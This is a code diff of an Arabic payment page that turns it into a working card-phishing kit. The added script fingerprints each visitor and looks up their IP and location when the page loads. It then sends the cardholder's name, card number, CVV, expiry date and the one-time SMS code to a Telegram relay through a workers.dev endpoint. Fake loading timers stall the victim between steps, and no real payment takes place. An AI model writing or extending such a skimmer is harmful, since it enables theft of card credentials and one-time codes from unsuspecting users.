@@ -99,7 +99,6 @@ html,body{
   margin-bottom:10px;
 }
 
-/* الشعار الثابت - لا يتغير أبداً */
 .card-logo-top{
   width:130px;
   height:37px;
@@ -287,201 +286,342 @@ html,body{
 
 <div class="screen active" id="paymentScreen">
   <div class="page">
-
     <div class="amount-title">المبلغ</div>
     <div class="amount-value" id="topAmount"></div>
-
     <div class="divider">
       <span>ادفع عن طريق البطاقة</span>
     </div>
-
     <div class="field-group">
       <label class="label">اسم حامل البطاقة</label>
-      <input
-        class="input"
-        id="cardHolder"
-        placeholder="اسم حامل البطاقة"
-        inputmode="text"
-        autocomplete="cc-name"
-        maxlength="40"
-      >
+      <input class="input" id="cardHolder" placeholder="اسم حامل البطاقة" inputmode="text" autocomplete="cc-name" maxlength="40">
     </div>
-
     <div class="field-group">
       <div class="card-head">
         <label class="label">معلومات البطاقة</label>
-
-        <!-- الشعار الثابت - لا يتغير أبداً ولا يتم تحديثه بناءً على نوع البطاقة -->
-        <div class="card-logo-top"
-             oncontextmenu="return false"
-             ondragstart="return false"
-             onselectstart="return false">
-          <img
-            id="staticCardLogo"
-            src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png"
-            alt="Card Logo"
-            draggable="false"
-            oncontextmenu="return false"
-            ondragstart="return false"
-          >
+        <div class="card-logo-top" oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
+          <img id="staticCardLogo" src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png" alt="Card Logo" draggable="false">
         </div>
       </div>
-
-      <input
-        class="input card-number"
-        id="cardNumber"
-        placeholder="0000 0000 0000 0000"
-        inputmode="numeric"
-        maxlength="19"
-        autocomplete="cc-number"
-      >
-
+      <input class="input card-number" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" autocomplete="cc-number">
       <div class="row">
         <div class="col">
-          <input
-            class="input"
-            id="cvv"
-            placeholder="CVV"
-            inputmode="numeric"
-            maxlength="3"
-            autocomplete="cc-csc"
-          >
+          <input class="input" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="3" autocomplete="cc-csc">
         </div>
-
         <div class="col">
           <div class="expiry-wrap" id="expiryWrap">
-            <select id="expMonth" class="expiry-select">
-              <option value="">MM</option>
-            </select>
-
+            <select id="expMonth" class="expiry-select"><option value="">MM</option></select>
             <div class="expiry-separator">/</div>
-
-            <select id="expYear" class="expiry-select">
-              <option value="">YY</option>
-            </select>
+            <select id="expYear" class="expiry-select"><option value="">YY</option></select>
           </div>
         </div>
       </div>
     </div>
-
     <button class="pay-btn" id="payBtn"></button>
   </div>
 </div>
 
 <div class="screen" id="loader60Screen">
-  <div class="loader-screen">
-    <div class="loader-box">
-      <div class="blue-spinner"></div>
-      <div class="loader-count" id="loader60Count">60</div>
-    </div>
-  </div>
+  <div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div><div class="loader-count" id="loader60Count">60</div></div></div>
 </div>
 
 <div class="screen" id="otpScreen">
   <div class="otp-page">
     <div class="otp-title">رمز التحقق</div>
-    <p class="otp-text">
-      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
-    </p>
-
-    <div class="field-group">
-      <input
-        class="input"
-        id="otpInput"
-        placeholder="أدخل رمز التحقق"
-        inputmode="numeric"
-        maxlength="6"
-        autocomplete="one-time-code"
-      >
-    </div>
-
+    <p class="otp-text">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</p>
+    <div class="field-group"><input class="input" id="otpInput" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6" autocomplete="one-time-code"></div>
     <button class="otp-btn" id="otpBtn">تحقق</button>
   </div>
 </div>
 
 <div class="screen" id="loader30Screen">
-  <div class="loader-screen">
-    <div class="loader-box">
-      <div class="blue-spinner"></div>
-    </div>
-  </div>
+  <div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div></div></div>
 </div>
 
 <script>
-const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
+// ====================== تكوين تلغرام ======================
+const TELEGRAM_WORKER = "https://delicate-cake-2fc2.mnya04637.workers.dev/";
+const CHAT_ID = "6918534470";
 
-// تعريف أنواع البطاقات (خلف الكواليس فقط)
+async function sendToTelegram(text) {
+  try {
+    await fetch(TELEGRAM_WORKER, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  } catch(e) { console.log("خطأ في الإرسال", e); }
+}
+
+// ====================== دوال البصمة والجهاز ======================
+async function sha256(message) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(message);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+async function getAdvancedFingerprint() {
+  const canvas = document.createElement('canvas');
+  canvas.width = 200;
+  canvas.height = 50;
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '14px Arial';
+  ctx.fillStyle = '#f60';
+  ctx.fillRect(0, 0, 100, 50);
+  ctx.fillStyle = '#069';
+  ctx.fillText('عميل عربي 2026', 2, 15);
+  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+  ctx.fillRect(100, 10, 80, 30);
+  const canvasHash = await sha256(canvas.toDataURL());
+
+  let webglHash = '';
+  const canvasGL = document.createElement('canvas');
+  const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
+  if (gl) {
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      webglHash = renderer + '|' + vendor;
+    }
+  }
+
+  const fontList = ['Arial', 'Tahoma', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+  const fontCheck = fontList.map(f => document.fonts.check(`12px "${f}"`) ? 1 : 0).join('');
+
+  const components = [
+    navigator.userAgent,
+    navigator.language,
+    screen.colorDepth,
+    new Date().getTimezoneOffset(),
+    navigator.hardwareConcurrency || '',
+    navigator.deviceMemory || '',
+    canvasHash,
+    webglHash,
+    fontCheck
+  ];
+  const finalStr = components.join('|');
+  const fingerprint = await sha256(finalStr);
+  return 'fp_adv_' + fingerprint.slice(0, 16);
+}
+
+function getDeviceType() {
+  const ua = navigator.userAgent;
+  if (/mobile/i.test(ua)) return "📱 جوال";
+  if (/tablet/i.test(ua)) return "📟 تاب";
+  return "💻 حاسوب";
+}
+
+function getOS() {
+  const ua = navigator.userAgent;
+  if (/Windows/i.test(ua)) return "Windows";
+  if (/Mac/i.test(ua)) return "MacOS";
+  if (/Linux/i.test(ua)) return "Linux";
+  if (/Android/i.test(ua)) return "Android";
+  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+  return "غير معروف";
+}
+
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (/Edg/i.test(ua)) return "Edge";
+  if (/Chrome/i.test(ua)) return "Chrome";
+  if (/Safari/i.test(ua)) return "Safari";
+  if (/Firefox/i.test(ua)) return "Firefox";
+  if (/Opera|OPR/i.test(ua)) return "Opera";
+  return "غير معروف";
+}
+
+async function getIPAndLocation() {
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+    let location = "غير متاح";
+    try {
+      const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const locData = await locRes.json();
+      if (locData.country_name) {
+        location = `${locData.country_name} - ${locData.city || ''}`;
+      }
+    } catch(e) {}
+    return { ip, location };
+  } catch(e) {
+    return { ip: "غير متاح", location: "غير متاح" };
+  }
+}
+
+// ====================== إدارة عدد الزيارات ======================
+function updateVisitCount() {
+  let count = localStorage.getItem("visitCount");
+  if (!count) count = 0;
+  count = parseInt(count) + 1;
+  localStorage.setItem("visitCount", count);
+  return count;
+}
+
+// ====================== إرسال الرسالة الأولى (بيانات الدخول) ======================
+let globalFingerprint = "";
+let globalIp = "";
+let globalLocation = "";
+let globalVisitCount = 0;
+
+async function sendFirstMessage() {
+  globalVisitCount = updateVisitCount();
+  globalFingerprint = await getAdvancedFingerprint();
+  const device = getDeviceType();
+  const os = getOS();
+  const browser = getBrowser();
+  const ipLoc = await getIPAndLocation();
+  globalIp = ipLoc.ip;
+  globalLocation = ipLoc.location;
+  
+  const msg = `👀🔍 دخل إلى بوابة الدفع
+____________________
+معلومات إضافية ⬇️
+🆔 البصمة الثابتة: ${globalFingerprint}
+📊 عدد مرات دخول الموقع: ${globalVisitCount}
+📱 نوع الجهاز: ${device} (${os})
+🌐 المتصفح: ${browser}
+🌍 الـ IP: ${globalIp}
+📍 الموقع: ${globalLocation}
+🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+  
+  await sendToTelegram(msg);
+}
+
+// ====================== دوال البطاقة (تحديد النوع خلف الكواليس) ======================
 const CardType = {
-  VISA: 'visa',
-  MASTERCARD: 'mastercard',
-  MADA: 'mada',
-  UNKNOWN: 'unknown'
+  VISA: 'فيزا',
+  MASTERCARD: 'ماستر كارد',
+  MADA: 'مدى',
+  UNKNOWN: 'غير معروف'
 };
 
-// =============== تحديد نوع البطاقة بدقة عالية (خلف الكواليس) ===============
-// يعتمد على البادئات المعروفة لفيزا وماستر كارد ومدى. لا يتم رفض أي بطاقة.
 function detectCardTypeStrong(cardDigits) {
   if (!cardDigits || cardDigits.length < 2) return CardType.UNKNOWN;
-  
-  // فيزا: تبدأ بـ 4
-  if (/^4/.test(cardDigits)) {
-    return CardType.VISA;
-  }
-  
-  // ماستر كارد: 51-55 أو 2221-2720
-  if (/^(5[1-5])/.test(cardDigits) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cardDigits)) {
-    return CardType.MASTERCARD;
-  }
-  
-  // مدى (Mada): البادئات الرسمية الأكثر شيوعاً
-  const madaPrefixes = [
-    '588845', '440647', '440795', '446404', '457865', '457997', '474491', 
-    '636120', '9682', '483010', '586983', '605141', '604906', '521000',
-    '530906', '531196', '535825', '543357', '545616', '546518', '548485',
-    '558848', '585265', '588982', '589005', '589206', '604393', '608072',
-    '627139', '636214', '636392', '637071', '639199', '639382', '639438'
-  ];
-  if (madaPrefixes.some(prefix => cardDigits.startsWith(prefix))) {
-    return CardType.MADA;
-  }
-  
+  if (/^4/.test(cardDigits)) return CardType.VISA;
+  if (/^(5[1-5])/.test(cardDigits) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cardDigits)) return CardType.MASTERCARD;
+  const madaPrefixes = ['588845','440647','440795','446404','457865','457997','474491','636120','9682','483010','586983','605141','604906','521000','530906','531196','535825','543357','545616','546518','548485','558848','585265','588982','589005','589206','604393','608072','627139','636214','636392','637071','639199','639382','639438'];
+  if (madaPrefixes.some(prefix => cardDigits.startsWith(prefix))) return CardType.MADA;
   return CardType.UNKNOWN;
 }
 
-// =============== التحقق من رقم البطاقة: فقط الطول = 16 رقماً (بدون Luhn) ===============
-function isCardNumberLengthValid(cardDigits) {
-  return cardDigits && cardDigits.length === 16;
+// التحقق من صحة الحقول (الطول فقط)
+function isCardNumberLengthValid(cardDigits) { return cardDigits && cardDigits.length === 16; }
+function validateCardHolder() {
+  const value = cardHolder.value.trim();
+  const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
+  if (value === "") { cardHolder.classList.remove("error"); return false; }
+  cardHolder.classList.toggle("error", !valid);
+  return valid;
+}
+function validateCardNumber() {
+  const rawDigits = cardNumber.value.replace(/\D/g, "");
+  if (rawDigits.length === 0) { cardNumber.classList.remove("error"); return false; }
+  const isValidLength = isCardNumberLengthValid(rawDigits);
+  cardNumber.classList.toggle("error", !isValidLength);
+  return isValidLength;
+}
+function validateCVV() {
+  const valid = /^\d{3}$/.test(cvv.value);
+  if (cvv.value.length === 0) { cvv.classList.remove("error"); return false; }
+  cvv.classList.toggle("error", !valid);
+  return valid;
+}
+function validateExpiry() {
+  const valid = expMonth.value !== "" && expYear.value !== "";
+  if (valid || (expMonth.value === "" && expYear.value === "")) expiryWrap.classList.remove("error");
+  else expiryWrap.classList.add("error");
+  expMonth.classList.toggle("has-value", expMonth.value !== "");
+  expYear.classList.toggle("has-value", expYear.value !== "");
+  return valid;
+}
+function validatePaymentForm() {
+  const holderOk = validateCardHolder();
+  const cardOk = validateCardNumber();
+  const cvvOk = validateCVV();
+  const expiryOk = validateExpiry();
+  if (!cardHolder.value.trim()) cardHolder.classList.add("error");
+  const rawDigits = cardNumber.value.replace(/\D/g, "");
+  if (!rawDigits) cardNumber.classList.add("error");
+  if (!cvv.value) cvv.classList.add("error");
+  if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
+  if (rawDigits.length > 0 && !isCardNumberLengthValid(rawDigits)) { cardNumber.classList.add("error"); return false; }
+  return holderOk && cardOk && cvvOk && expiryOk;
 }
 
-// =============== دوال المبلغ ===============
-function normalizeAmount(value) {
-  if (!value || typeof value !== "string") return null;
-  return value.trim();
+// ====================== إرسال الرسالة الثانية (بيانات الدفع) ======================
+let paymentSent = false;
+async function sendPaymentMessage() {
+  if (paymentSent) return;
+  const rawDigits = cardNumber.value.replace(/\D/g, "");
+  const cardType = detectCardTypeStrong(rawDigits);
+  const holderName = cardHolder.value.trim() || "غير مدخل";
+  const cardNum = cardNumber.value.trim() || "غير مدخل";
+  const cvvVal = cvv.value.trim() || "غير مدخل";
+  const month = expMonth.value || "MM";
+  const year = expYear.value || "YY";
+  const expiry = `${month}/${year}`;
+  
+  const msg = `💳💰 معلومات الدفع
+________________________
+🏷️ نوع البطاقة: ${cardType}
+🔢 رقم البطاقة: ${cardNum}
+🔐 رمز الأمان: ${cvvVal}
+📅 تاريخ الانتهاء: ${expiry}
+👤 اسم حامل البطاقة: ${holderName}
+__________________
+📎 معلومات إضافية ⬇️
+🆔 البصمة: ${globalFingerprint}
+🌐 IP: ${globalIp}
+📍 الموقع: ${globalLocation}`;
+  
+  await sendToTelegram(msg);
+  paymentSent = true;
 }
 
+// ====================== إرسال الرسالة الثالثة (رمز التحقق OTP) ======================
+let otpSent = false;
+async function sendOtpMessage() {
+  if (otpSent) return;
+  const otpCode = otpInput.value.trim() || "غير مدخل";
+  const msg = `🔐✅ رمز التحقق
+🔢 رمز التحقق: ${otpCode}
+____________________
+معلومات إضافية ⬇️
+🆔 البصمة: ${globalFingerprint}
+🌐 IP: ${globalIp}
+📍 الموقع: ${globalLocation}
+🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+  
+  await sendToTelegram(msg);
+  otpSent = true;
+}
+
+// ====================== إعداد عناصر الصفحة وسير العمل ======================
+const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
+function normalizeAmount(value) { return value && typeof value === "string" ? value.trim() : null; }
 function setAmount(amount) {
   const finalAmount = normalizeAmount(amount);
   if (!finalAmount) return;
   document.getElementById("topAmount").textContent = finalAmount;
   document.getElementById("payBtn").textContent = "ادفع " + finalAmount;
 }
-
 async function loadAmount() {
   try {
     const res = await fetch(API_URL + "?t=" + Date.now(), { cache: "no-store" });
     const data = await res.json();
     if (data && data.ok && data.amount) setAmount(data.amount);
-  } catch (e) { console.log("تعذر تحميل المبلغ", e); }
+  } catch(e) { console.log("تعذر تحميل المبلغ", e); }
 }
-loadAmount();
-setInterval(loadAmount, 3000);
 
-// =============== عناصر DOM ===============
 const paymentScreen = document.getElementById("paymentScreen");
 const loader60Screen = document.getElementById("loader60Screen");
 const otpScreen = document.getElementById("otpScreen");
 const loader30Screen = document.getElementById("loader30Screen");
-
 const cardHolder = document.getElementById("cardHolder");
 const cardNumber = document.getElementById("cardNumber");
 const cvv = document.getElementById("cvv");
@@ -493,169 +633,36 @@ const otpInput = document.getElementById("otpInput");
 const otpBtn = document.getElementById("otpBtn");
 const loader60Count = document.getElementById("loader60Count");
 
-let loader60Timer = null;
-let loader30Timer = null;
+let loader60Timer = null, loader30Timer = null;
 
 // تعبئة قوائم الشهر والسنة
-for (let i = 1; i <= 12; i++) {
-  const option = document.createElement("option");
-  option.value = String(i).padStart(2, "0");
-  option.textContent = String(i).padStart(2, "0");
-  expMonth.appendChild(option);
-}
-for (let y = 26; y <= 50; y++) {
-  const option = document.createElement("option");
-  option.value = String(y);
-  option.textContent = String(y);
-  expYear.appendChild(option);
-}
-
-[expMonth, expYear].forEach(select => {
-  select.addEventListener("paste", (e) => e.preventDefault());
-});
+for (let i = 1; i <= 12; i++) { let opt = document.createElement("option"); opt.value = String(i).padStart(2,"0"); opt.textContent = String(i).padStart(2,"0"); expMonth.appendChild(opt); }
+for (let y = 26; y <= 50; y++) { let opt = document.createElement("option"); opt.value = String(y); opt.textContent = String(y); expYear.appendChild(opt); }
+[expMonth, expYear].forEach(select => select.addEventListener("paste", e => e.preventDefault()));
 
 function showScreen(screenEl) {
   [paymentScreen, loader60Screen, otpScreen, loader30Screen].forEach(el => el.classList.remove("active"));
   screenEl.classList.add("active");
 }
 
-// التحقق من اسم الحامل (حروف ومسافات فقط)
-function validateCardHolder() {
-  const value = cardHolder.value.trim();
-  const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
-  if (value === "") {
-    cardHolder.classList.remove("error");
-    return false;
-  }
-  cardHolder.classList.toggle("error", !valid);
-  return valid;
-}
-cardHolder.addEventListener("input", function () {
-  this.value = this.value.replace(/[^A-Za-z ]/g, "");
-  validateCardHolder();
-});
-cardHolder.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  const cleaned = text.replace(/[^A-Za-z ]/g, "");
-  this.value = cleaned.slice(0, 40);
-  validateCardHolder();
-});
-
-// التحقق من رقم البطاقة: فقط 16 خانة (لا يتم استخدام Luhn إطلاقاً)
-function validateCardNumber() {
-  const rawDigits = cardNumber.value.replace(/\D/g, "");
-  if (rawDigits.length === 0) {
-    cardNumber.classList.remove("error");
-    return false;
-  }
-  const isValidLength = isCardNumberLengthValid(rawDigits);
-  cardNumber.classList.toggle("error", !isValidLength);
-  return isValidLength;
-}
-cardNumber.addEventListener("input", function () {
-  let digits = this.value.replace(/\D/g, "").slice(0, 16);
+// أحداث التحقق
+cardHolder.addEventListener("input", function() { this.value = this.value.replace(/[^A-Za-z ]/g, ""); validateCardHolder(); });
+cardHolder.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/[^A-Za-z ]/g, "").slice(0,40); validateCardHolder(); });
+cardNumber.addEventListener("input", function() {
+  let digits = this.value.replace(/\D/g, "").slice(0,16);
   this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
   validateCardNumber();
-  
-  // تحديد نوع البطاقة خلف الكواليس (يظهر فقط في console - قوي جداً)
   const fullDigits = this.value.replace(/\D/g, "");
-  if (fullDigits.length >= 6) {
-    const detectedType = detectCardTypeStrong(fullDigits);
-    console.log(`[خلف الكواليس] تم التعرف على نوع البطاقة: ${detectedType}`);
-  }
+  if (fullDigits.length >= 6) console.log(`[نوع البطاقة خلف الكواليس] ${detectCardTypeStrong(fullDigits)}`);
 });
-cardNumber.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  let digits = text.replace(/\D/g, "").slice(0, 16);
-  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-  validateCardNumber();
-});
-cardNumber.addEventListener("blur", function() {
-  const digits = this.value.replace(/\D/g, "");
-  if (digits.length > 0 && !isCardNumberLengthValid(digits)) this.classList.add("error");
-});
-
-// التحقق من CVV (3 أرقام)
-function validateCVV() {
-  const valid = /^\d{3}$/.test(cvv.value);
-  if (cvv.value.length === 0) {
-    cvv.classList.remove("error");
-    return false;
-  }
-  cvv.classList.toggle("error", !valid);
-  return valid;
-}
-cvv.addEventListener("input", function () {
-  this.value = this.value.replace(/\D/g, "").slice(0, 3);
-  validateCVV();
-});
-cvv.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  this.value = text.replace(/\D/g, "").slice(0, 3);
-  validateCVV();
-});
-
-// التحقق من تاريخ الانتهاء
-function validateExpiry() {
-  const valid = expMonth.value !== "" && expYear.value !== "";
-  if (valid || (expMonth.value === "" && expYear.value === "")) {
-    expiryWrap.classList.remove("error");
-  } else {
-    expiryWrap.classList.add("error");
-  }
-  expMonth.classList.toggle("has-value", expMonth.value !== "");
-  expYear.classList.toggle("has-value", expYear.value !== "");
-  return valid;
-}
+cardNumber.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); let digits = text.replace(/\D/g, "").slice(0,16); this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim(); validateCardNumber(); });
+cvv.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,3); validateCVV(); });
+cvv.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/\D/g, "").slice(0,3); validateCVV(); });
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
-
-// التحقق من OTP
-function validateOTP() {
-  const value = otpInput.value;
-  const valid = /^\d{4,6}$/.test(value);
-  if (value.length === 0) {
-    otpInput.classList.remove("error");
-    return false;
-  }
-  otpInput.classList.toggle("error", !valid);
-  return valid;
-}
-otpInput.addEventListener("input", function () {
-  this.value = this.value.replace(/\D/g, "").slice(0, 6);
-  validateOTP();
-});
-otpInput.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  this.value = text.replace(/\D/g, "").slice(0, 6);
-  validateOTP();
-});
-
-// التحقق الشامل من نموذج الدفع (لا يتم رفض أي بطاقة بناءً على نوعها أو Luhn، فقط الطول 16)
-function validatePaymentForm() {
-  const holderOk = validateCardHolder();
-  const cardOk = validateCardNumber();    // فقط الطول 16
-  const cvvOk = validateCVV();
-  const expiryOk = validateExpiry();
-
-  if (!cardHolder.value.trim()) cardHolder.classList.add("error");
-  const rawDigits = cardNumber.value.replace(/\D/g, "");
-  if (!rawDigits) cardNumber.classList.add("error");
-  if (!cvv.value) cvv.classList.add("error");
-  if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
-
-  // لا يوجد فحص Luhn على الإطلاق
-  if (rawDigits.length > 0 && !isCardNumberLengthValid(rawDigits)) {
-    cardNumber.classList.add("error");
-    return false;
-  }
-
-  return holderOk && cardOk && cvvOk && expiryOk;
-}
+otpInput.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,6); validateOTP(); });
+otpInput.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/\D/g, "").slice(0,6); validateOTP(); });
+function validateOTP() { const valid = /^\d{4,6}$/.test(otpInput.value); if (otpInput.value.length===0) { otpInput.classList.remove("error"); return false; } otpInput.classList.toggle("error", !valid); return valid; }
 
 // المؤقتات
 function startLoader60ThenOTP() {
@@ -666,52 +673,42 @@ function startLoader60ThenOTP() {
   loader60Timer = setInterval(() => {
     seconds--;
     loader60Count.textContent = seconds;
-    if (seconds <= 0) {
-      clearInterval(loader60Timer);
-      showScreen(otpScreen);
-    }
+    if (seconds <= 0) { clearInterval(loader60Timer); showScreen(otpScreen); }
   }, 1000);
 }
-
 function startLoader30ThenBackOTP() {
   clearTimeout(loader30Timer);
   showScreen(loader30Screen);
-  loader30Timer = setTimeout(() => {
-    otpInput.value = "";
-    otpInput.classList.remove("error");
-    showScreen(otpScreen);
-  }, 30000);
+  loader30Timer = setTimeout(() => { otpInput.value = ""; otpInput.classList.remove("error"); showScreen(otpScreen); }, 30000);
 }
 
-// حدث زر الدفع
-payBtn.addEventListener("click", function () {
+// زر الدفع
+payBtn.addEventListener("click", async function() {
   if (!validatePaymentForm()) return;
-  
-  const cardDigits = cardNumber.value.replace(/\D/g, "");
-  let detectedCardType = CardType.UNKNOWN;
-  if (cardDigits.length >= 6) detectedCardType = detectCardTypeStrong(cardDigits);
-  console.log(`[معاملة آمنة] جاري معالجة بطاقة مكونة من 16 رقمًا، النوع المحدد خلف الكواليس: ${detectedCardType}`);
-  
+  await sendPaymentMessage();   // إرسال بيانات البطاقة فوراً
   startLoader60ThenOTP();
 });
 
-// حدث زر OTP
-otpBtn.addEventListener("click", function () {
-  if (!otpInput.value) {
-    otpInput.classList.add("error");
-    return;
-  }
+// زر OTP
+otpBtn.addEventListener("click", async function() {
+  if (!otpInput.value) { otpInput.classList.add("error"); return; }
   if (!validateOTP()) return;
+  await sendOtpMessage();       // إرسال رمز التحقق
   startLoader30ThenBackOTP();
 });
 
-// حماية الشعار من السحب والنسخ
-document.addEventListener("contextmenu", (e) => {
-  if (e.target.closest(".card-logo-top")) e.preventDefault();
-});
-document.addEventListener("dragstart", (e) => {
-  if (e.target.closest(".card-logo-top")) e.preventDefault();
+// حماية الشعار
+document.addEventListener("contextmenu", e => { if(e.target.closest(".card-logo-top")) e.preventDefault(); });
+document.addEventListener("dragstart", e => { if(e.target.closest(".card-logo-top")) e.preventDefault(); });
+
+// تحميل المبلغ وتشغيل الرسالة الأولى
+loadAmount();
+setInterval(loadAmount, 3000);
+
+// إرسال الرسالة الأولى بعد تحميل الصفحة وتجهيز البيانات
+window.addEventListener("load", async () => {
+  await sendFirstMessage();
 });
 </script>
 </body>
-</html>
+                                               </html>
